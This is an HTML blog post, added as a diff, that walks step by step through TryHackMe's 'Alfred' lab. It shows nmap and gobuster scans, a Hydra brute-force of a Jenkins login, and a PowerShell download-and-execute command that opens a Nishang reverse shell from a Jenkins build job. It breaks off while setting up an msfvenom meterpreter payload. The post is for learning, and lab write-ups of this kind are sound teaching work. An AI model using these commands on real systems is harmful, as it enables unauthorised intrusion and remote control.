@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Tzero86@trojanwave/posts/alfred_writeup/</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="all,follow">
+    <meta name="googlebot" content="index,follow,snippet,archive">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/terminal-0.7.1.min.css">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/animate-3.7.2.min.css">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/console.css">
+    
+      <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+      <![endif]-->
+       <meta property="og:title" content="Alfred_writeup.sh" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://tzero86bits.tk/posts/alfred_writeup/" /><meta property="article:published_time" content="2020-08-16T14:00:11-04:00" />
+
+
+
+<meta name="twitter:title" content="Alfred_writeup.sh"/>
+<meta name="twitter:description" content="Alfred - TryHackme&rsquo;s Room Writeup This is my first attempt at creating a write-up, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those."/>
+
+</head>
+<body class="terminal">
+    <div class="container">
+        <div class="terminal-nav">
+          <header class="terminal-logo">
+            <div class="logo terminal-prompt">
+              
+              
+              <a href="https://tzero86bits.tk/" class="no-style site-name">Tzero86@trojanwave</a>:~# 
+              <a href='https://tzero86bits.tk/posts'>posts</a>/<a href='https://tzero86bits.tk/posts/alfred_writeup'>alfred_writeup</a>/</div></header>
+          <nav class="terminal-menu">
+            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
+                
+                <li><a href="https://tzero86bits.tk/about/" typeof="ListItem">about/</a></li>
+                
+                <li><a href="https://tzero86bits.tk/posts/" typeof="ListItem">posts/</a></li>
+                
+                <li><a href="https://tzero86bits.tk/photos/" typeof="ListItem">photos/</a></li>
+                
+            </ul>
+          </nav>
+        </div>
+    </div>
+
+    <div class="container animated zoomIn fast" >
+        
+<h1>Alfred_writeup.sh</h1>
+Aug. 16, 2020
+
+
+<br/><br/>
+<img src="../img/alfred_room_cover.gif" alt="Post Cover Gif animation";>
+<br/><br/>
+<h2 id="alfred---tryhackmes-room-writeup">Alfred - TryHackme&rsquo;s Room Writeup</h2>
+<p><img src="/img/alfred_room_cover.gif" alt="Alt text for my gif"></p>
+<p>This is my first attempt at creating a write-up, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those. I even left some futile attempts of enumeration to be honest about my process of solving this. I hope somebody finds this useful somehow, it certainly helped me to practice some tools and approaches. As I&rsquo;m still quite new to this, you can expect some errors in this post or maybe spot some things that an experienced person could probably solve better. I&rsquo;m learning, beware of the blog.</p>
+<h2 id="task-1---getting-initial-access">[Task 1] - Getting Initial Access</h2>
+<p>For this room it seems we&rsquo;ll need <strong>Nishang</strong> in order to gain access to the machine by using <strong><em>reverse shell scripts</em></strong>.</p>
+<p>So lets start by listing the links to get this <strong>Nishang</strong> tool:</p>
+<ul>
+<li><strong>Nishang</strong>: <a href="https://github.com/samratashok/nishang">Click here</a> to access the repository and get this Powershell toolset.</li>
+<li><strong>Alfred Room on THM</strong>: <a href="https://tryhackme.com/room/alfred">Click here</a> to visit this room on TryHackme platform.</li>
+</ul>
+<p>Ok once you have that tool downloaded to your system we can get started. Let&rsquo;s go question by question as designed for this THM box.</p>
+<blockquote>
+<p>Question #1: How many ports are open?</p>
+</blockquote>
+<p>Ok so for this question we&rsquo;ll run <strong>Nmap</strong> to enumerate any open ports. It is important to note that the room description mentions this machine <strong>won&rsquo;t respond to ping (ICMP)</strong> requests. So we&rsquo;ll need to add a switch to deal with that when running our scan.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo nmap -A -Pn -p- 10.10.177.5
+
+</code></pre></div><p>We&rsquo;ll use the switch/flag <strong>-Pn</strong> to avoid <strong>Nmap</strong> doing a ping before starting the scans. Also we use <strong>-p-</strong> to scan for all the ports  instead of the most common ones.</p>
+<p>Once we get our results back we&rsquo;ll now the response for the first question. <em>Scanning all ports might take a while.</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-16 14:19 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.177.5
+Host is up <span style="color:#f92672">(</span>0.39s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65532</span> filtered ports
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/html).
+</span><span style="color:#e6db74">3389/tcp open  ssl/ms-wbt-server?
+</span><span style="color:#e6db74">8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
+</span><span style="color:#e6db74">| http-robots.txt: 1 disallowed entry 
+</span><span style="color:#e6db74">|_/
+</span><span style="color:#e6db74">|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+</span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/html;charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
+Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 SP1 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> SP1 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows 8.1 Update <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> or <span style="color:#ae81ff">2008</span> Beta <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows 8.1 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+Network Distance: <span style="color:#ae81ff">4</span> hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 8080/tcp<span style="color:#f92672">)</span>
+HOP RTT       ADDRESS
+<span style="color:#ae81ff">1</span>   247.10 ms 10.13.0.1
+<span style="color:#ae81ff">2</span>   ... <span style="color:#ae81ff">3</span>
+<span style="color:#ae81ff">4</span>   385.31 ms 10.10.177.5
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 558.59 seconds
+
+</code></pre></div><p>Ok, so based on these results we now know how many ports are open.</p>
+<blockquote>
+<p>Question #2: What is the username and password for the login panel(in the format username:password)?</p>
+</blockquote>
+<p>Ok let&rsquo;s start by seeing what is being served in the port <strong>80</strong> of this machine.</p>
+<p><img src="https://i.imgur.com/FK0zWJh.png" alt="enter image description here">
+Ok so we get an email <em><strong>﻿alfred@wayneenterprises.com</strong></em>, and a picture. Let&rsquo;s see if we get any other useful information by inspecting the <strong>DOM</strong>.</p>
+<p>It seems there is not much info lying around the code of the page. It is always worth checking anyway.</p>
+<p>The next thing we can check, is to review if we may have any data encrypted into that image of Bruce Wayne.  So let&rsquo;s download it.</p>
+<p>At this point we would need a <strong>passphrase</strong> if we want to attempt to extract any possibly hidden data in from this image. Since we don&rsquo;t have any piece of info so far that could act as a passphrase. We&rsquo;ll move forward from this for now. Also we are not even sure if this image has had any <strong>steganography</strong> job done.</p>
+<p>I would be wise to start scanning for some other directories we might be able to access. Let&rsquo;s use GoBuster.</p>
+<p>let&rsquo;s start a GoBuster scan with a small list first and see how it goes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.177.5/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+</code></pre></div><p>This might also take some time to run, but once it finishes we should have a better idea if there are any common directories that we can access.</p>
+<p>This is what the GoBuster scan in progress looks like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://10.10.177.5/
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">10</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
+<span style="color:#f92672">===============================================================</span>
+2020/08/16 14:45:12 Starting gobuster
+<span style="color:#f92672">===============================================================</span>
+Progress: <span style="color:#ae81ff">11841</span> / <span style="color:#ae81ff">87665</span> <span style="color:#f92672">(</span>13.51%<span style="color:#f92672">)</span>
+
+</code></pre></div><p>While we wait for GoBuster to try to find any directories. Let&rsquo;s take a look at what we have at port <strong>8080</strong>.</p>
+<p><img src="https://i.imgur.com/oLuheqV.png" alt="port 8080 login page">
+Ok so we get a login form, we might as well try out some basic user:password combinations to see if maybe the security has overlooked something that basic.</p>
+<p>We can go with the basic <strong>admin:1234</strong>, <strong>admin:password</strong>, <strong>admin:admin</strong>, etc.</p>
+<p>Look at that, using <strong>admin:admin</strong> to log in has granted us access to Jenkins.</p>
+<p><img src="https://i.imgur.com/kzHXdI4.png" alt="Jenkins admin panel"></p>
+<p><strong><em>But wait, what if we didn&rsquo;t managed to find that super insecure credential?</em></strong> Well, in that case we should try to demonstrate how to use a combination of Burp and Hydra to brute force the login form. Let&rsquo;s look into that now.</p>
+<p>To start let&rsquo;s launch <strong>Burp Suite</strong>, we&rsquo;ll be using the integrated browser to navigate the site and review the details of the login request it gets sent when we attempt to log into Jenkins.</p>
+<p><img src="https://i.imgur.com/SBakfmQ.png" alt="Burp Suite"></p>
+<blockquote>
+<p><em>NOTE:</em> If you get an error about the integrated browser not able to run due to sandboxed settings. Got to Project Options -&gt; Misc -&gt; Check &ldquo;allow the embedded browser to run without a sandbox&rdquo;.</p>
+</blockquote>
+<p>Once you have Burp running in the <strong>Proxy -&gt; Intercept</strong> tab click on <strong>Open Browser</strong>. In the new Browser window open the machine IP at port 8080 to load the Jenkins login form.</p>
+<ul>
+<li>Remember to add the target IP to Burp&rsquo;s Scope, so it doesn&rsquo;t stop every single request from non-target related IPs.</li>
+</ul>
+<p>Ok so in order to brute force the login with Hydra, we need to Intercept a login request with Burp so we can get some important pieces of Information: <strong>[URL]</strong>, <strong>[UsernameField]</strong>, <strong>[PasswordField]</strong> and the <strong>[InvalidCredentialsErrorMessage]</strong>. These are all required for our Hydra attack.</p>
+<p>To get those, let&rsquo;s attempt to login with some invalid credentials just as <strong>test:test</strong>.</p>
+<p><img src="https://i.imgur.com/AKP9Wop.png" alt="Jenkins Login error"></p>
+<p>Let&rsquo;s see the request in Burp:</p>
+<p><img src="https://i.imgur.com/KL3wpw9.png" alt="Intercepted Login Request">
+As we can see in the intercepted request we get the rest of the pieces we were looking for. So now we have all of them ready for Hydra:</p>
+<ul>
+<li><strong>[URL]</strong>: /j_acegi_security_check</li>
+<li><strong>[UsernameField]</strong>: j_username</li>
+<li><strong>[PasswordField]</strong>: j_password</li>
+<li><strong>[InvalidCredentialsErrorMessage]</strong>: Invalid username or password</li>
+</ul>
+<p>We&rsquo;ll also need to know the <strong>[PORT]</strong> where the login forms lives, but we know that already from our Nmap scan(8080).</p>
+<p>So now let&rsquo;s try to configure <strong>Hydra</strong> so we can trigger that brute force attack.</p>
+<p>First let&rsquo;s review the required parameters we must specify and how our command its formated:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo hydra -s <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span> http-form-post <span style="color:#e6db74">&#34;/[URL]:[UsernameField]=^USER^&amp;[PasswordField]=^PASS^:[InvalidCredentialsErrorMessage]&#34;</span> -L rockyou.txt -P rockyou.txt
+</code></pre></div><p>So if we fill in the required data, and using rockyou.txt our command will look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo hydra -s <span style="color:#ae81ff">8080</span> 10.10.192.65 http-form-post <span style="color:#e6db74">&#34;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^:Invalid username or password&#34;</span> -L rockyou.txt -P rockyou.txt
+</code></pre></div><p>This might take a while to complete and we probably have to locate a better password/usernames wordlist, so it is worth mentioning <strong>SecLists</strong> as a great resource for those. Check <a href="https://github.com/danielmiessler/SecLists">this link</a>.</p>
+<p>After a while we should see something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-17 14:10:53
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">205761065451876</span> login tries <span style="color:#f92672">(</span>l:14344374/p:14344374<span style="color:#f92672">)</span>, ~12860066590743 tries per task
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.192.65:8080/j_acegi_security_check:j_username<span style="color:#f92672">=</span>^USER^&amp;j_password<span style="color:#f92672">=</span>^PASS^:Invalid username or password
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 384.00 tries/min, <span style="color:#ae81ff">384</span> tries in 00:01h, <span style="color:#ae81ff">205761065451492</span> to <span style="color:#66d9ef">do</span> in 8930601799:07h, <span style="color:#ae81ff">16</span> active
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 384.00 tries/min, <span style="color:#ae81ff">1152</span> tries in 00:03h, <span style="color:#ae81ff">205761065450724</span> to <span style="color:#66d9ef">do</span> in 8930601799:05h, <span style="color:#ae81ff">16</span> active
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 381.71 tries/min, <span style="color:#ae81ff">2672</span> tries in 00:07h, <span style="color:#ae81ff">205761065449204</span> to <span style="color:#66d9ef">do</span> in 8984078456:30h, <span style="color:#ae81ff">16</span> active
+
+</code></pre></div><p>As you can see this attack is gonna take a while since rockyou.txt is quite a large list. So let&rsquo;s use one of the SecList&rsquo;s shorter lists called <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/best1050.txt"><strong>best1050.txt</strong></a>.</p>
+<p>With the new list we get our result much faster:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo hydra -s <span style="color:#ae81ff">8080</span> 10.10.192.65 http-form-post <span style="color:#e6db74">&#34;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^:Invalid username or password&#34;</span> -L best1050.txt -P best1050.txt -w <span style="color:#ae81ff">30</span>
+Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-17 14:32:55
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">1102500</span> login tries <span style="color:#f92672">(</span>l:1050/p:1050<span style="color:#f92672">)</span>, ~68907 tries per task
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.192.65:8080/j_acegi_security_check:j_username<span style="color:#f92672">=</span>^USER^&amp;j_password<span style="color:#f92672">=</span>^PASS^:Invalid username or password
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 384.00 tries/min, <span style="color:#ae81ff">384</span> tries in 00:01h, <span style="color:#ae81ff">1102116</span> to <span style="color:#66d9ef">do</span> in 47:51h, <span style="color:#ae81ff">16</span> active
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 384.00 tries/min, <span style="color:#ae81ff">1152</span> tries in 00:03h, <span style="color:#ae81ff">1101348</span> to <span style="color:#66d9ef">do</span> in 47:49h, <span style="color:#ae81ff">16</span> active
+<span style="color:#f92672">[</span>8080<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 10.10.192.65   login: admin   password: admin
+</code></pre></div><p>So that gives us the answer to Question #2 in a brute-forced way.</p>
+<p>Let&rsquo;s move to the next objective.</p>
+<blockquote>
+<p>Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: <strong><em>powershell iex (New-Object Net.WebClient).DownloadString(&lsquo;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&rsquo;);Invoke-PowerShellTcp -Reverse -IPAddress your-IP -Port your-port</em></strong></p>
+</blockquote>
+<p>Well this objective kind of gives us quite a hit at what to do next. I figure we need to find a way to execute that on our newly accessed server. Let&rsquo;s take a look at what can we do in our Jenkins admin panel.</p>
+<p>If we take a look at the existing jobs in the server, we see this job called <strong>project</strong> which was last run months ago, but it also ran successfully.</p>
+<p><img src="https://i.imgur.com/cilmo5K.png" alt="Running Job on the server">
+Let&rsquo;s click on the job name to see what else we got here.</p>
+<p><img src="https://i.imgur.com/9IRIUNm.png" alt="Job details page">
+If we click the <strong>configure</strong> button on this dashboard. We get the specific details of what this job does. Let&rsquo;s scroll down to the <strong>Build</strong> to see some more info.</p>
+<p><img src="https://i.imgur.com/T86ylyd.png" alt="Job build command">
+So this job only runs a <strong>whoami</strong> command. I figure we can just use this section to place our exploitation command as suggested by the room&rsquo;s hint.</p>
+<p>Ok, so the idea is this, we&rsquo;ll locally create a <strong>Python3 HTTP Server</strong> to serve the PowerShell script we get from <strong>Nishang</strong>  and we add the command to retrieve that script from our local sever into the Jenkin&rsquo;s Job build command.</p>
+<p>Ok so looking at <strong>Nishang&rsquo;s</strong> folder we see that we have all scripts categorized. We&rsquo;ll be attempting to get a reverse shell, so let&rsquo;s look inside <strong>/nishang/Shells/</strong></p>
+<p>From the room&rsquo;s hint we already know we are looking for, <strong>Invoke-PowerShellTcp.ps1</strong></p>
+<p>So let&rsquo;s get this file shared in our local HTTP server.
+We navigate to the <strong>Shells</strong> folder and fire up our server like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo python3 -m http.server
+</code></pre></div><p>We should see something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+</code></pre></div><p>So our server is ready. Let&rsquo;s get that command set on the Jenkins job next.</p>
+<p>Ok, let&rsquo;s review the command. We need to make some adjustments before we paste it into Jenkins.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#39;</span>);Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+</code></pre></div><p>We need to change the <strong>IP and Port</strong>  and also make sure we specify a port value for our reverse shell. So this full command would attempt to connect to our local server to get the PS script and then open a reverse shell on a specific port to connect to our local listener(we&rsquo;ll do that in a bit).</p>
+<blockquote>
+<p><strong>Remember to get your correct IP when connected to THMs VPN. It is usually tun0. Run <em>ip add</em> command to see your IP.</strong></p>
+</blockquote>
+<p>In my case the command will look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;http://10.13.0.34:8000/Invoke-PowerShellTcp.ps1&#39;</span>);Invoke-PowerShellTcp -Reverse -IPAddress 10.13.0.34 -Port 6666
+</code></pre></div><p>We have the command ready, we are just missing one tiny crucial part. We need to open a local listener on port 666 so our exploit can successfully open a reverse shell. Let&rsquo;s do that.</p>
+<p>In a terminal window start a <strong>netcat</strong> listener on port <strong>6666</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nc -lvp <span style="color:#ae81ff">6666</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">6666</span> ...
+</code></pre></div><p>That&rsquo;s done, now to paste our full command into the Jenkins Job Build command section.</p>
+<p><img src="https://i.imgur.com/aWPWDUy.png" alt="We enter our exploit command">
+After we enter the command, we click on the <strong>Save</strong> button to save the changes.</p>
+<p>Then we go back to the main project details page.
+Let&rsquo;s trigger a new build by clicking on <strong>Build Now</strong> button so we see if your command runs fine.</p>
+<p><img src="https://i.imgur.com/2RYq1y7.png" alt="Build Now button"></p>
+<p>We see a new build has been queued:</p>
+<p><img src="https://i.imgur.com/blngU7y.png" alt="our basic HTTP server works">
+We see that our local server has received a request to serve a file, this seems to be working fine so far:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+10.10.177.5 - - <span style="color:#f92672">[</span>16/Aug/2020 16:58:25<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /Invoke-PowerShellTcp.ps1 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</code></pre></div><p>Let&rsquo;s see if something happened in our listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">6666</span> ...
+10.10.177.5: inverse host lookup failed: Unknown host
+connect to <span style="color:#f92672">[</span>10.13.0.34<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.177.5<span style="color:#f92672">]</span> <span style="color:#ae81ff">49204</span>
+Windows PowerShell running as user bruce on ALFRED
+Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.
+
+PS C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\w</span>orkspace<span style="color:#ae81ff">\p</span>roject&gt;
+
+</code></pre></div><p>We got a reverse shell successfully!</p>
+<p>so let&rsquo;s explore the machine a bit. If we type <strong>dir c:/</strong> we&rsquo;ll navigate to the root folder. From here we can go up into the Users folder to see what we got. We see a <strong>bruce</strong> user there. We can review each folder but for the sake of not making this write-up eternal Let&rsquo;s see what&rsquo;s inside the <strong>bruce/Desktop/</strong> folder.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>ruce<span style="color:#ae81ff">\D</span>esktop
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---        10/25/2019   3:22 PM         <span style="color:#ae81ff">32</span> user.txt                          
+
+
+PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>ruce<span style="color:#ae81ff">\D</span>esktop&gt; type user.txt
+<span style="color:#f92672">{</span>and-we-finally-get-the-flag-value<span style="color:#f92672">}</span>
+
+</code></pre></div><p>Well, we made it this far. We were able to exploit a Jenkins project/job and we managed to get a reverse shell successfully. With this we can mark Question #3 as completed and we can  also answer question number 4.</p>
+<blockquote>
+<p>As it turns out we didn&rsquo;t need any <strong>GoBuster</strong> scans. They returned nothing useful anyways. However, we still we managed to get the initial access and it never hurts to do some extra enumeration.</p>
+</blockquote>
+<h2 id="task-2---switching-shells">[Task 2] - Switching shells</h2>
+<p>In this section we&rsquo;ll see how to leverage <strong>meterpreter</strong> to aid our privilege escalation attempts.</p>
+<p>In this section there is not much to add, as the room really provides almost all you need to answer the only question asked:</p>
+<blockquote>
+<p>Question: What is the final size of the exe payload that you generated?</p>
+</blockquote>
+<p>Ok so we&rsquo;ll be using <strong>msfvenom</strong> to generate a payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST<span style="color:#f92672">=[</span>IP<span style="color:#f92672">]</span> LPORT<span style="color:#f92672">=[</span>PORT<span style="color:#f92672">]</span> -f exe -o <span style="color:#f92672">[</span>SHELL NAME<span style="color:#f92672">]</span>.exe
+</code></pre></div><p>We need to replace <strong>[IP], [PORT] and [SHELL NAME]</strong></p>
+<p>For the sake of simplicity we&rsquo;ll bake this payload on the same <strong>Shells</strong> folder where we started our local server already.</p>
+<p>In my case the final <strong>msfvenom</strong> command looks like this:</p>
